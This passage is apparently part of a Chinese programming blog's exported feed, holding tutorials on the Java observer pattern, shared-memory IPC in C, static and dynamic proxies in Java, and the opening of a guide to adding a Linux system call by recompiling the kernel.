</span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.observerList.remove(observer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 通知所有观察者</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">notify</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (Observer item : observerList) &#123;</span><br><span class="line">            item.update(msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="测试类"><a href="#测试类" class="headerlink" title="测试类"></a>测试类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ObserverTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Subject mySubject = <span class="keyword">new</span> SubjectIplm();</span><br><span class="line">        Observer myObserver1 = <span class="keyword">new</span> ObserverIplm(<span class="string">"myObserver1"</span>);</span><br><span class="line">        Observer myObserver2 = <span class="keyword">new</span> ObserverIplm(<span class="string">"myObserver2"</span>);</span><br><span class="line">        mySubject.registerObserver(myObserver1);</span><br><span class="line">        mySubject.registerObserver(myObserver2);</span><br><span class="line">        mySubject.notify(<span class="string">"震惊！Java居然是世界上最好的语言！"</span>);</span><br><span class="line">        System.out.println(<span class="string">"====================="</span>);</span><br><span class="line">        <span class="comment">// myObserver1 颇为震惊 果断取消订阅（C生万物）</span></span><br><span class="line">        mySubject.removeObserver(myObserver1);</span><br><span class="line">        mySubject.notify(<span class="string">"Java天下第一！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">myObserver1收到新内容，为：震惊！Java居然是世界上最好的语言！</span><br><span class="line">myObserver2收到新内容，为：震惊！Java居然是世界上最好的语言！</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">myObserver2收到新内容，为：Java天下第一！</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><p>优点：降低了耦合，使得耦合的观察者和被观察者都只依赖于抽象接口，从而各自的变换都不会影响另一方。</p>
</li>
<li><p>缺点：消息通知是顺序进行，那么一个观察者卡顿，会影响整体的执行效率 。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>观察者</tag>
      </tags>
  </entry>
  <entry>
    <title>进程之间使用共享内存通信</title>
    <url>/2020/04/22/%E8%BF%9B%E7%A8%8B%E4%B9%8B%E9%97%B4%E4%BD%BF%E7%94%A8%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98%E9%80%9A%E4%BF%A1/</url>
    <content><![CDATA[<h2 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h2><p>共享内存就是映射一段能被其他进程所访问的内存，这段共享内存由一个进程创建，但多个进程都可以访问。共享内存是最快的 IPC 方式，它是针对其他进程间通信方式运行效率低而专门设计的。<a id="more"></a></p>
<p>但是它并未提供同步机制，即在某一个进程结束对共享内存的写操作之前，并不能可以阻止第二个进程开始对它进行读取，因此我们需要人为阻止通过其他机制进行同步。</p>
<h2 id="shmget-函数"><a href="#shmget-函数" class="headerlink" title="shmget()函数"></a>shmget()函数</h2><p>用于得到一个共享内存标识符或创建一个共享内存。</p>
<p>函数原型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">int</span> shmflg)</span></span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>key</td>
<td>标识共享内存的键值，shmget()函数成功时返回一个与key相关的共享内存标识符（非负整数），用于后续的共享内存函数。调用失败返回-1.</td>
</tr>
<tr>
<td>size</td>
<td>指明共享内存的大小，以字节为单位</td>
</tr>
<tr>
<td>shmflg</td>
<td>权限标志<br>IPC_CREAT  如果共享内存不存在，则创建一个共享内存，否则打开操作。<br>  IPC_EXCL  只有在共享内存不存在的时候，新的共享内存才建立，否则就产生错误。</td>
</tr>
</tbody></table>
<h2 id="shmat-函数"><a href="#shmat-函数" class="headerlink" title="shmat()函数"></a>shmat()函数</h2><p>第一次创建完共享内存后，它还不能被任何进程访问，<code>shmat()</code>函数的作用就是用来启动对该共享内存的访问，并把共享内存连接到当前进程的地址空间。</p>
<p>原型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">shmat</span><span class="params">(<span class="keyword">int</span> shmid, <span class="keyword">const</span> <span class="keyword">void</span> *shmaddr, <span class="keyword">int</span> shmflg)</span></span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>shmid</td>
<td>共享存储的id，如shmget()函数的返回值</td>
</tr>
<tr>
<td>shmaddr</td>
<td>指定共享内存连接到当前进程中的地址位置，一般为0，表示让内核自己决定一个合适的地址位置</td>
</tr>
<tr>
<td>shmflg</td>
<td>SHM_RDONLY：为只读模式，其他为读写模式，如0</td>
</tr>
</tbody></table>
<p>调用成功时返回一个指向共享内存第一个字节的指针，如果调用失败返回-1。</p>
<h2 id="shmdt-函数"><a href="#shmdt-函数" class="headerlink" title="shmdt()函数"></a>shmdt()函数</h2><p>与<code>shmat</code>函数相反，是用来断开与共享内存附加点的地址，禁止本进程访问此片共享内存，但是并不是删除该共享内存。</p>
<p>原型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmdt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *shmaddr)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>shmaddr</strong>:连接的共享内存的起始地址，如<code>shmat()</code>函数的返回值。调用成功的时候返回0，失败时返回-1。</p>
<h2 id="shmctl-函数"><a href="#shmctl-函数" class="headerlink" title="shmctl()函数"></a>shmctl()函数</h2><p>控制共享内存。</p>
<p>原型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmctl</span><span class="params">(<span class="keyword">int</span> shm_id, <span class="keyword">int</span> command, struct shmid_ds *buf)</span></span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>shm_id</td>
<td>共享内存标识符，如shmget()的返回值</td>
</tr>
<tr>
<td>command</td>
<td>一些命令，如<br>IPC_STAT：得到共享内存的状态，把共享内存的shmid_ds结构复制到buf中<br>IPC_SET：如果进程有足够的权限，就把共享内存的当前关联值设置为shmid_ds结构中给出的值<br>IPC_RMID：删除这片共享内存</td>
</tr>
<tr>
<td>buf</td>
<td>共享内存管理结构体。</td>
</tr>
</tbody></table>
<p>shmid_ds结构 至少包括以下成员：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct shmid_ds</span><br><span class="line">&#123;</span><br><span class="line">    uid_t shm_perm.uid;</span><br><span class="line">    uid_t shm_perm.gid;</span><br><span class="line">    mode_t shm_perm.mode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>例如一个简单的例子，父子进程通过共享内存的方式进行通信：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-04-22 14:22:16</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-04-22 21:38:34</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\others\shareMemory.c</span></span><br><span class="line"><span class="comment"> * @祈祷不出现BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shareMemoryDate</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> mod;</span><br><span class="line">    <span class="keyword">char</span> msg[<span class="number">100</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> *shm = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shareMemoryDate</span> *<span class="title">share</span>;</span></span><br><span class="line">    <span class="comment">// 创建一个共享内存</span></span><br><span class="line">    <span class="comment">// IPC_CREAT表示如果共享内存不存在，则创建一个共享内存，否则打开操作。</span></span><br><span class="line">    <span class="comment">// 需要与IPC对象存取权限（如0600）进行|运算来确定信号量集的存取权限</span></span><br><span class="line">    <span class="keyword">int</span> shm_id =</span><br><span class="line">        shmget((<span class="keyword">key_t</span>)<span class="number">0</span>, <span class="keyword">sizeof</span>(struct shareMemoryDate), <span class="number">0600</span> | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span> (shm_id == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"创建共享内存失败，我也不知为什么\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> pId = fork();</span><br><span class="line">    <span class="keyword">if</span> (pId == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"创建子进程失败，我也不知为什么\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pId == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//子进程</span></span><br><span class="line">        <span class="comment">// 将共享内存连接到当前进程的地址空间</span></span><br><span class="line">        shm = shmat(shm_id, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (shm == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"链接失败，我也不知为什么\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        share = (struct shareMemoryDate *)shm;</span><br><span class="line">        <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"我是子进程，请输入想要写入共享内存的内容:\n"</span>);</span><br><span class="line">        fgets(<span class="built_in">buffer</span>, <span class="keyword">sizeof</span>(<span class="built_in">buffer</span>), <span class="built_in">stdin</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(share-&gt;msg, <span class="built_in">buffer</span>);</span><br><span class="line">        <span class="comment">// 表示将数据写入完毕</span></span><br><span class="line">        share-&gt;mod = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 把共享内存从当前进程中分离</span></span><br><span class="line">        <span class="keyword">if</span> (shmdt(shm) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"分离失败，我也不知为什么\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pId &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//父进程</span></span><br><span class="line">        <span class="comment">// 将共享内存连接到当前进程的地址空间</span></span><br><span class="line">        shm = shmat(shm_id, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (shm == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"链接失败，我也不知为什么\n"</span>);</span><br><span class="line">            <span class="comment">// 删除共享内存</span></span><br><span class="line">            <span class="keyword">if</span> (shmctl(shm_id, IPC_RMID, <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"（无法链接）删除共享内存失败，我也不知为什么\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        share = (struct shareMemoryDate *)shm;</span><br><span class="line">        <span class="comment">//等待子进程写入完毕</span></span><br><span class="line">        <span class="keyword">while</span> (share-&gt;mod != <span class="number">1</span>) sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"我是父进程，让我看看我的子进程在共享内存里边写了什么东西：\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, share-&gt;msg);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"噢，原来是这些鬼玩意\n"</span>);</span><br><span class="line">        <span class="comment">// 删除共享内存</span></span><br><span class="line">        <span class="keyword">if</span> (shmctl(shm_id, IPC_RMID, <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"(读取完毕)删除共享内存失败，我也不知为什么\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yalexin@yalexin-PC:/media/yalexin/软件/my_c_workspace/others$ gcc -o share shareMemory.c</span><br><span class="line">yalexin@yalexin-PC:/media/yalexin/软件/my_c_workspace/others$ ./share</span><br><span class="line">我是子进程，请输入想要写入共享内存的内容:</span><br><span class="line">你好啊</span><br><span class="line">我是父进程，让我看看我的子进程在共享内存里边写了什么东西：</span><br><span class="line">你好啊</span><br><span class="line"></span><br><span class="line">噢，原来是这些鬼玩意</span><br><span class="line">yalexin@yalexin-PC:/media/yalexin/软件/my_c_workspace/others$</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux相关</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>进程通信</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式之动态代理</title>
    <url>/2020/05/10/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p>上文介绍了<a href="https://yalexin.gitee.io/2020/05/10/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/">静态代理</a>,本文介绍动态代理。</p>
<p>所谓动态，是指代理类是动态生成的，而不是我们提前定义好的。</p>
<p>动态代理实现的方式</p>
<ul>
<li>原生JDK（比较常用）</li>
<li>CGLIB（需要导包 cloud-cglib.jar ）</li>
</ul>
<p>这里介绍利用原生JDK的方式实现<a id="more"></a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DynamicProxy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ProxyInvocationHandler pih = <span class="keyword">new</span> ProxyInvocationHandler();</span><br><span class="line">        Cook d_shef = <span class="keyword">new</span> Chef();</span><br><span class="line">        <span class="comment">// 设置需要代理的对象</span></span><br><span class="line">        pih.setTarget(d_shef);</span><br><span class="line">        <span class="comment">// 动态生成代理类</span></span><br><span class="line">        Cook proxy = (Cook) pih.getProxy();</span><br><span class="line">        proxy.cook(<span class="string">"番茄炒蛋"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Cook</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">cook</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chef</span> <span class="keyword">implements</span> <span class="title">Cook</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cook</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 具体的实际实现逻辑</span></span><br><span class="line">        System.out.println(<span class="string">"=======厨师做饭啦:"</span>+name+<span class="string">"======="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于自动生成代理类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 被代理的接口</span></span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTarget</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生成得到代理类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getProxy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(<span class="keyword">this</span>.getClass().getClassLoader(),</span><br><span class="line">                target.getClass().getInterfaces(), <span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理代理实例 并返回结果</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> proxy  代理对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> method 代理对象调用的方法</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 调用的方法中的参数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Throwable</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        before();</span><br><span class="line">        <span class="comment">//  动态代理的本质，是利用反射机制实现</span></span><br><span class="line">        Object result = method.invoke(target, args);</span><br><span class="line">        after();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 预处理</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"=======食材准备完毕======="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后处理</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"=======厨具清理完毕======="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>控制台输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;食材准备完毕&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;厨师做饭啦:番茄炒蛋&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;厨具清理完毕&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>优点：只需要定义实现<code>InvocationHandler</code>接口的实现类，利用该类的实例对象将托管类的实例对象进行绑定即可实现代理； 动态代理的服务内容不需要像静态代理一样写在每个代码块中，只需要写在invoke()方法中即可，降低了代码的冗余度。 </p>
</li>
<li><p>缺点：任然需要一个实现接口的实现类。要想不需要接口，可借助 <code>CGLIB</code>，关于相关的用法，不在本文介绍范围之内。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>动态代理</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式之静态代理</title>
    <url>/2020/05/10/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h2 id="代理模式定义"><a href="#代理模式定义" class="headerlink" title="代理模式定义"></a>代理模式定义</h2><p>代理模式又叫委托模式，为某一个对象提供一个代理对象，代理通过访问原对象，使得真正实施动作的是原对象。一个简单的例子就是：</p>
<p>一个厨师想要做饭的时候，他必须要有食材，做完饭之后需要清理厨具，但是对于厨师来说，他的任务就是做饭，其他的事情他不想插手，那么他就可以雇用一个帮手，为他做这些准备工作和处理工作。<a id="more"></a></p>
<p>代理模式一般可分为静态代理和动态代理：</p>
<ul>
<li>静态代理： 由程序员创建或工具生成代理类的源码，再编译代理类。 静态代理也就是意味着程序运行之前就已经自动生成代理类的字节码文件，代理类和委托类的关系就已经确认下来。</li>
<li>动态代理： 动态代理类的源码是在程序运行期间由JVM根据反射等机制动态的生成，过程不会生成多余的字节码文件，代理类和委托类的关系在运行时期确认。</li>
</ul>
<p>本文只讨论静态代理。</p>
<h2 id="代码说明"><a href="#代码说明" class="headerlink" title="代码说明"></a>代码说明</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StaticProxy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Cook chef  = <span class="keyword">new</span> Chef();</span><br><span class="line">        Cook chefProxy = <span class="keyword">new</span> ChefProxy(chef);</span><br><span class="line">        chefProxy.cook();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 委托类和代理类都要实现该接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Cook</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">cook</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chef</span> <span class="keyword">implements</span> <span class="title">Cook</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 具体的实际实现逻辑</span></span><br><span class="line">        System.out.println(<span class="string">"=======厨师做饭啦======="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChefProxy</span> <span class="keyword">implements</span> <span class="title">Cook</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Cook chef = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 默认代理自己</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChefProxy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.chef = <span class="keyword">new</span> ChefProxy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指明需要代理的对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChefProxy</span><span class="params">(Cook chef)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.chef = chef;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.before();</span><br><span class="line">        <span class="keyword">this</span>.chef.cook();</span><br><span class="line">        <span class="keyword">this</span>.after();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 预处理</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"=======食材准备完毕======="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后处理</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"=======厨具清理完毕======="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>控制台输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;食材准备完毕&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;厨师做饭啦&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;厨具清理完毕&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<ul>
<li>优点：委托类只关心具体的逻辑，无需浪费时间在其他无关事务上面；代理类还可以实现对委托类的管控，例如说上文的例子，假如某道菜厨师不会做或者不在行，帮手可以提醒或者直接拒绝厨师的行为，即根据对象的权限来进行实施动作。</li>
<li>不足：<ul>
<li>需要代理的逻辑方法比较少的时候难度不大，假如方法非常多的时候，代码量就会非常多</li>
<li>接口增加方法的时候，不仅仅委托类需要实现该方法，代理类也需要实现该方法，代码维护难度大。</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>静态代理</tag>
      </tags>
  </entry>
  <entry>
    <title>通过编译内核的方式增加系统调用</title>
    <url>/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</url>
    <content><![CDATA[<blockquote>
<p>Ubuntu 版本：20.04 LTS</p>
<p>虚拟机配置：硬盘：40 GB 内存：4 GB</p>
<p>内核版本：5.4.0.26-generic</p>
<p>VMware 版本：15.5.0</p>
</blockquote>
<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>编译的时候需要一些库，所以要提前安装：<a id="more"></a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libncurses5-dev</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install bison</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install flex</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libssl-dev</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install build-essential</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-install kernel-package</span><br></pre></td></tr></table></figure>

